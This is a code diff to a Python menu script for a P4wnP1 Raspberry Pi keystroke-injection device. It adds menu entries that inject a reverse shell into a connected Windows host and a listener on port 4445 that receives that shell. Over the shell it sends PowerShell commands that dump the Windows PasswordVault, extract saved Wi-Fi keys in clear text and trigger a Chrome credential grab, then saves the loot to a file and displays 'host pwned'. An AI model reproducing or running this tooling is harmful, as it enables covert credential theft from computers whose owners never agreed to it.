@@ -12,6 +12,7 @@ import subprocess
 from PIL import Image
 from PIL import ImageDraw
 from PIL import ImageFont
+import socket, sys
 import os
 import base64
 GPIO.setwarnings(False)
@@ -38,24 +39,26 @@ line5 = top+34
 line6 = top+43
 line7 = top+52
 brightness = 255 #Max
+fichier=""
 # Move left to right keeping track of the current x position for drawing shapes.
 x = 0
 RST = 25
 CS = 8      
 DC = 24
 
-#GPIO define
+#GPIO define and OLED configuration
 RST_PIN        = 25 #waveshare settings
 CS_PIN         = 8  #waveshare settings
 DC_PIN         = 24 #waveshare settings
 KEY_UP_PIN     = 6  #stick up
 KEY_DOWN_PIN   = 19 #stick down
-KEY_LEFT_PIN   = 5  #sitck left
-KEY_RIGHT_PIN  = 26 #stick right
+KEY_LEFT_PIN   = 5  #sitck left // go back
+KEY_RIGHT_PIN  = 26 #stick right // go in // validate
 KEY_PRESS_PIN  = 13 #stick center button
-KEY1_PIN       = 21 #key 1
-KEY2_PIN       = 20 #key 2
-KEY3_PIN       = 16 #key 3
+KEY1_PIN       = 21 #key 1 // up
+KEY2_PIN       = 20 #key 2 // cancel/goback
+KEY3_PIN       = 16 #key 3 // down
+USER_I2C = 0        #set to 1 if your oled is I2C or  0 if use SPI interface
 #init GPIO
 GPIO.setmode(GPIO.BCM) 
 GPIO.setup(KEY_UP_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)    # Input with pull-up
@@ -69,7 +72,7 @@ GPIO.setup(KEY3_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)      # Input with pull-u
 screensaver = 0
 #SPI
 #serial = spi(device=0, port=0, bus_speed_hz = 8000000, transfer_size = 4096, gpio_DC = 24, gpio_RST = 25)
-USER_I2C = 0 #set to 1 if your oled is I2C
+
 if  USER_I2C == 1:
     GPIO.setmode(GPIO.BCM)
     GPIO.setup(RST,GPIO.OUT)    
@@ -135,9 +138,9 @@ def switch_menu(argument):
         39: "_TRIGGER ACTIONS",
         40: "_NETWORK",
         41: "_",
-        42: "_Work in Progress",
-        43: "_",
-        44: "_",
+        42: "_Inject Rshell(ADMIN)",
+        43: "_Inject Rshell (USER)",
+        44: "_Revesreshell Exploit",
         45: "_",
         46: "_",
         47: "_",
@@ -381,6 +384,7 @@ def templateSelect(liste):
             menu = 1
         else: # button is pressed:
             retour = fichier[cur]
+            print(retour)
             return(retour)    
         # ----------
         DisplayText(ligne[0],ligne[1],ligne[2],ligne[3],ligne[4],ligne[5],ligne[6])
@@ -395,14 +399,22 @@ def runhid():
         answer = 0
         while answer == 0:
             DisplayText(
-                "                 YES",
+                "YES              YES",
                 "",
                 "",
                 fichier,
                 "",
                 "",
-                "                  NO"
+                "NO                NO"
                 )
+            if GPIO.input(KEY_UP_PIN): # button is released
+                menu = 1
+            else: # button is pressed:
+                answer = 1
+            if GPIO.input(KEY_DOWN_PIN): # button is released
+                menu = 1
+            else: # button is pressed:
+                answer = 2
             if GPIO.input(KEY1_PIN): # button is released
                 menu = 1
             else: # button is pressed:
@@ -425,6 +437,18 @@ def runhid():
                 "",
                 "       Run direct job"
                 )
+            if GPIO.input(KEY_UP_PIN): # button is released
+                menu = 1
+            else: # button is pressed:
+                answer = 1
+            if GPIO.input(KEY_LEFT_PIN): # button is released
+                menu = 1
+            else: # button is pressed:
+                answer = 2
+            if GPIO.input(KEY_DOWN_PIN): # button is released
+                menu = 1
+            else: # button is pressed:
+                answer = 3            
             if GPIO.input(KEY1_PIN): # button is released
                 menu = 1
             else: # button is pressed:
@@ -482,18 +506,28 @@ def GetTemplateList(type):
             result = result + list[n] + "\n"
     return(result)   
 def ApplyTemplate(template,section):
+    print(template)
+    print(section)
     while GPIO.input(KEY_LEFT_PIN):
         answer = 0
         while answer == 0:
             DisplayText(
-                "                 YES",
+                "YES              YES",
                 "",
                 "",
-                template,
+                fichier,
                 "",
                 "",
-                "                  NO"
+                "NO                NO"
                 )
+            if GPIO.input(KEY_UP_PIN): # button is released
+                menu = 1
+            else: # button is pressed:
+                answer = 1
+            if GPIO.input(KEY_DOWN_PIN): # button is released
+                menu = 1
+            else: # button is pressed:
+                answer = 2
             if GPIO.input(KEY1_PIN): # button is released
                 menu = 1
             else: # button is pressed:
@@ -640,6 +674,18 @@ def SetTypingSpeed():
             "",
             "    Fast typing speed"
             )
+        if GPIO.input(KEY_UP_PIN): # button is released
+            menu = 1
+        else: # button is pressed:
+            answer = 1
+        if GPIO.input(KEY_LEFT_PIN): # button is released
+            menu = 1
+        else: # button is pressed:
+            answer = 2
+        if GPIO.input(KEY_DOWN_PIN): # button is released
+            menu = 1
+        else: # button is pressed:
+            answer = 3         
         if GPIO.input(KEY1_PIN): # button is released
             menu = 1
         else: # button is pressed:
@@ -803,6 +849,151 @@ def Osdetection():
             "Press LEFT to exit"
             )
     
+def socketCreate():
+    try:
+        global host
+        global port
+        global s
+        port = 4445
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        host = ''
+        if port == '':
+            socketCreate()
+        #socketCreate()
+    except socket.error as msg:
+        print('socket creation error: ' + str(msg[0]))
+def socketBind():
+    try:
+        print('Binding socket at port %s'%(port))
+        s.bind((host,port))
+        s.listen(1)
+    except socket.error as msg:
+        print('socket bindig error: ' + str(msg[0]))
+        print('Retring...')
+        socketBind()
+def socketAccept():
+    global conn
+    global addr
+    global hostname
+    try:
+        conn, addr = s.accept()
+        print('[!] Session opened at %s:%s'%(addr[0],addr[1]))
+        menu2()
+    except socket.error as msg:
+        print('Socket Accepting error: ' + str(msg[0]))
+def sendps1(ps1file):        
+        f=open(ps1file,"r")
+        for x in f:
+            conn.send(x.encode())
+            result = conn.recv(16834)
+            print(result.decode())
+def menu2():
+    DisplayText(
+            "",
+            "",
+            "",
+            "      PLEASE WAIT",
+            "",
+            "",
+            ""
+            )    
+    shell("P4wnP1_cli hid job 'GetChrome.js'")
+    hack = ""
+    command = "Test-Connection -computer \"google.com\" -count 1 -quiet"
+    conn.send(command.encode())
+    result = conn.recv(16834)
+    if result.decode()[:-6]=="T":
+        print("Internet is on, on host")    
+    conn.send("hostname".encode())
+    result = conn.recv(16834)
+    print(result.decode().replace("\r\n","")[:-1])
+    hostname = result.decode().replace("\r\n","")[:-1]
+    command = "[System.IO.DriveInfo]::getdrives() |where-object {$_.VolumeLabel -match \"USBKEY\"}|sort {$_.name} |foreach-object {; echo \"$(echo $_.name)\";}"
+    conn.send(command.encode())
+    result = conn.recv(16834)
+    usbkey = result.decode().replace("\r\n","")[:-1]
+    print("Usb key detected in : [" +usbkey+"]")
+    hack = hostname + "\n"
+    hack = hack + "Passwords windows :\n"
+    command="$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$VaultObj = new-object Windows.Security.Credentials.PasswordVault;"
+    conn.send(command.encode())
+    result = conn.recv(16834)
+    print(result.decode())
+    command = "$VaultObj.RetrieveAll() | foreach { $_.RetrievePassword(); $_ }"
+    conn.send(command.encode())
+    result = conn.recv(16834)
+    hack = hack + result.decode()
+    print(result.decode())
+    DisplayText(
+            "",
+            "",
+            "GETTING MS EXPLORER",
+            "      PASSWORDS",
+            "",
+            "",
+            ""
+            )    
+    command = "$SSID=((netsh wlan show profiles) -match 'Profil Tous les utilisateurs[^:]+:.(.+)$').replace(\"Profil Tous les utilisateurs\",\"\").replace(\":\",\"\").replace(\" \",\"\").split(\"\\n\");$fin=\"\";"
+    conn.send(command.encode())
+    result = conn.recv(16834)
+    print(result.decode())
+    command = "for ($n=0;$n -le $SSID.count-1;$n++){try {;$fin = $fin + $SSID[$n]+((netsh wlan show profiles $SSID[$n].Substring($SSID[$n].Length -($SSID[$n].Length -1)) key=clear) -match 'Contenu de la c[^:]+:.(.+)$').split(\":\")[1];} catch {};};$fin"
+    conn.send(command.encode())
+    time.sleep(2)
+    result = conn.recv(16834)
+    print(result.decode())
+    hack = hack + "Wifi : \n" + result.decode()
+    DisplayText(
+            "",
+            "",
+            "GET STORED WIFI SSID",
+            "      PASSWORDS",
+            "",
+            "",
+            ""
+            )
+    time.sleep(2)
+    DisplayText(
+            "",
+            "",
+            "GET GOOGLE CHROME",
+            "      PASSWORDS",
+            "",
+            "",
+            ""
+            )
+    time.sleep(2)
+    print('end')
+    #done , let save this on disk
+    f=open("/root/" + hostname+".txt","w+")
+    f.write(hack)
+    f.close()
+    print(hostname+".txt saved, host is pwned")
+    while 1:
+        #cmd = raw_input('PS >')
+        cmd ='quit'
+        if cmd == 'quit':
+            conn.close()
+            s.close()
+            while GPIO.input(KEY_LEFT_PIN):
+                    DisplayText(
+                    "DONE HOST PWNED FIND",
+                    "ALL INFOS IN FILE",
+                    "/root/"+hostname+".txt",
+                    "CHOME CREDS are in",
+                    usbkey+hostname+"chrome.txt",
+                    "",
+                    "Press LEFT to Exit"
+                    )
+            return
+            #sys.exit()
+        command = conn.send(cmd)
+        result = conn.recv(16834)
+        print(result)
+def main():
+    socketCreate()
+    socketBind()
+    socketAccept()
 #init vars 
 curseur = 1
 page=0  
@@ -811,6 +1002,7 @@ ligne = ["","","","","","","",""]
 selection = 0
 splash()  # display boot splash image ---------------------------------------------------------------------
 #print("selected : " + FileSelect(hidpath,".js"))
+device.contrast(2)
 while 1:
     if GPIO.input(KEY_UP_PIN): # button is released
         menu = 1
@@ -890,6 +1082,7 @@ while 1:
                 if curseur == 3:
                     #USB
                     template = templateSelect("USB")
+                    print(template)
                     if template!="":
                         ApplyTemplate(template,"u")
                 if curseur == 4:
@@ -907,6 +1100,77 @@ while 1:
                     template = templateSelect("NETWORK")
                     if template!="":
                         ApplyTemplate(template,"n")
+            if page == 42:
+                #infosec commands
+                if curseur == 1:
+                    # reverseshell injection
+                    answer = 0
+                    while answer == 0:
+                        DisplayText(
+                            "                 YES",
+                            "",
+                            "INJECT REVERSESHELL",
+                            "TO CONNECTED HOST",
+                            "ARE YOU SURE ?",
+                            "",
+                            "                  NO"
+                            )
+                        if GPIO.input(KEY1_PIN): # button is released
+                            menu = 1
+                        else: # button is pressed:
+                            answer = 1
+                        if GPIO.input(KEY3_PIN): # button is released
+                            menu = 1
+                        else: # button is pressed:
+                            answer = 2
+                    if answer == 1:
+                        shell("P4wnP1_cli hid job 'gui inject revshell.js'")
+                if curseur == 3:
+                    # reverseshell exploitation
+                    answer = 0
+                    while answer == 0:
+                        DisplayText(
+                            "                 YES",
+                            "",
+                            "EXPLOIT REVERSESHELL",
+                            " ON CONNECTED HOST",
+                            "  ARE YOU SURE ?",
+                            "",
+                            "                  NO"
+                            )
+                        if GPIO.input(KEY1_PIN): # button is released
+                            menu = 1
+                        else: # button is pressed:
+                            answer = 1
+                        if GPIO.input(KEY3_PIN): # button is released
+                            menu = 1
+                        else: # button is pressed:
+                            answer = 2
+                    if answer == 1:
+                        main()
+                if curseur == 2:
+                    # reverseshell injection user
+                    answer = 0
+                    while answer == 0:
+                        DisplayText(
+                            "                 YES",
+                            "",
+                            "INJECT REVERSESHELL",
+                            "TO CONNECTED HOST",
+                            "ARE YOU SURE ?",
+                            "",
+                            "                  NO"
+                            )
+                        if GPIO.input(KEY1_PIN): # button is released
+                            menu = 1
+                        else: # button is pressed:
+                            answer = 1
+                        if GPIO.input(KEY3_PIN): # button is released
+                            menu = 1
+                        else: # button is pressed:
+                            answer = 2
+                    if answer == 1:
+                        shell("P4wnP1_cli hid job 'gui inject revshell user.js'")                    
             if page == 0:
             #we are in main menu
                 if curseur == 1:
